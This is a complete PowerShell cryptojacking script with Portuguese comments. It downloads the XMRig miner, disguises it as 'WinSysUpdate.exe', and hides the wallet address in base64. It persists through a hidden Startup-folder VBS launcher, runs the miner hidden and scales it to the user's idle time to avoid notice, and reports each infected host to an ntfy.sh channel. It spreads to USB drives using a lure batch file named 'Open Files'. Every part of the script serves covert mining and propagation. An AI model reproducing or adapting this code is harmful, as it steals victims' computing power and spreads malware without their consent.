# Este script é a versão standalone do minerador adaptativo com monitoramento.

# Forçar TLS 1.2 para conexões seguras
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$win32Code = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [StructLayout(LayoutKind.Sequential)]
    public struct LASTINPUTINFO {
        public uint cbSize;
        public uint dwTime;
    }
}
'@

if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type -TypeDefinition $win32Code
}

$b64 = "MHg3ZDBCMDI5Zjk2MzQ4ODk2RWRhQzMxOTgwMTQ5Njg2MWM4ODhiQTE0"
$wallet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
# Configuração Ntfy.sh
$ntfyUrl = "https://ntfy.sh/gsgzs"
$startTime = Get-Date

$tempBase = "$env:LOCALAPPDATA\WinSysUpdate"
$dir = "$tempBase\bin"
$logFile = "$tempBase\sys_log.txt"
$newPath = Join-Path $dir "WinSysUpdate.exe"

function Send-Checkin {
    param($status, $currentMode)
    try {
        $uptime = (New-TimeSpan -Start $startTime -End (Get-Date)).ToString("dd'd 'hh'h 'mm'm'")
        $msg = "💻 Host: $env:COMPUTERNAME`n🛠 Status: $status`n📈 Modo: $currentMode`n⏱ Uptime: $uptime`n📅 Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
        
        $headers = @{
            Title = "Minerador Status"
            Priority = "default"
            Tags = "hammer,computer"
        }
        
        Invoke-RestMethod -Uri $ntfyUrl -Method Post -Body $msg -Headers $headers -ContentType "text/plain; charset=utf-8"
    } catch {
        $err = $_.Exception.Message
        "$(Get-Date) - Ntfy Error: $err" | Out-File $logFile -Append
    }
}

# 1. Persistencia
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$shortcutPath = "$startupFolder\WinSysUpdate.vbs"
if (-not (Test-Path $shortcutPath)) {
    $vbsContent = "CreateObject(`"Wscript.Shell`").Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"`" + `"$PSCommandPath`" + `"`"`", 0, False"
    Set-Content -Path $shortcutPath -Value $vbsContent
}

# 2. Download
if (-not (Test-Path $dir)) {
    if (-not (Test-Path $tempBase)) { New-Item -ItemType Directory -Path $tempBase -Force | Out-Null }
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    $zip = "$tempBase\update.zip"
    try {
        Invoke-WebRequest -Uri $url -OutFile $zip
        Expand-Archive -Path $zip -DestinationPath $dir -Force
        Remove-Item $zip
    } catch {
        "$(Get-Date) - Download Error: $_" | Out-File $logFile -Append
    }
}

$xmrigOrig = Get-ChildItem -Path $dir -Filter xmrig.exe -Recurse | Select-Object -First 1
if ($xmrigOrig -and -not (Test-Path $newPath)) {
    Move-Item $xmrigOrig.FullName $newPath -Force
}

function Get-IdleTime {
    $lii = New-Object Win32+LASTINPUTINFO
    $lii.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($lii)
    if ([Win32]::GetLastInputInfo([ref]$lii)) {
        return ([Environment]::TickCount - $lii.dwTime) / 1000
    }
    return 0
}

$mode = "none"
Send-Checkin "Iniciado Standalone" $mode

while ($true) {
    $idleTime = Get-IdleTime
    $isUserActive = $idleTime -lt 30

    if ($isUserActive -and $mode -ne "active") {
        Stop-Process -Name "WinSysUpdate" -ErrorAction SilentlyContinue
        if (Test-Path $newPath) {
            $args = "-o rx.unmineable.com:3333 -u MATIC:$($wallet).srv01#p0o1-l2m3 -p x -a rx/0 --cpu-max-threads-hint 25 --priority 1 --log-file `"$logFile`""
            Start-Process -FilePath $newPath -ArgumentList $args -WindowStyle Hidden
            $mode = "active"
            Send-Checkin "Modo Baixo Consumo (Usuario Ativo)" $mode
        }
    } 
    elseif (-not $isUserActive -and $mode -ne "idle") {
        Stop-Process -Name "WinSysUpdate" -ErrorAction SilentlyContinue
        if (Test-Path $newPath) {
            $args = "-o rx.unmineable.com:3333 -u MATIC:$($wallet).srv01#p0o1-l2m3 -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --randomx-1gb-pages --cuda --opencl --log-file `"$logFile`""
            Start-Process -FilePath $newPath -ArgumentList $args -WindowStyle Hidden
            $mode = "idle"
            Send-Checkin "Modo Full Power (Usuario Ocioso)" $mode
        }
    }

    # Propagacao USB
    try {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { (Get-Volume -DriveLetter $_.Name).DriveType -eq 2 }
        foreach ($d in $drives) {
            $dest = Join-Path ($d.Root) "SystemUpdate"
            if (-not (Test-Path $dest)) {
                New-Item -ItemType Directory -Path $dest -Force | Out-Null
                Copy-Item -Path (Split-Path $PSCommandPath) -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
                $bat = "@echo off`r`npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"%~dp0miner.ps1`"`r`nexit"
                Set-Content -Path (Join-Path $d.Root "Abrir_Arquivos.bat") -Value $bat
            }
        }
    } catch {}

    Start-Sleep -Seconds 60
}
